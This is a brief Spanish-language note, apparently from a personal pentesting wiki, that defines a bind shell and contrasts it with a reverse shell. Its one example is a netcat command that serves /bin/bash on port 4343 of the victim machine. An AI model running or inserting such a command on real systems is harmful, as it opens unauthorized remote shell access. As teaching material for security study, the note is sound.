Es aquella que se obtiene al servir una shell desde un puerto de la máquina víctima y conectarse a él desde la máquina atacante. Es lo opuesto a una [[Reverse shell]].

# Ejemplos

## Linux

### Netcat

```bash
nc -lvnp 4343 -e /bin/bash
```
> En la máquina víctima.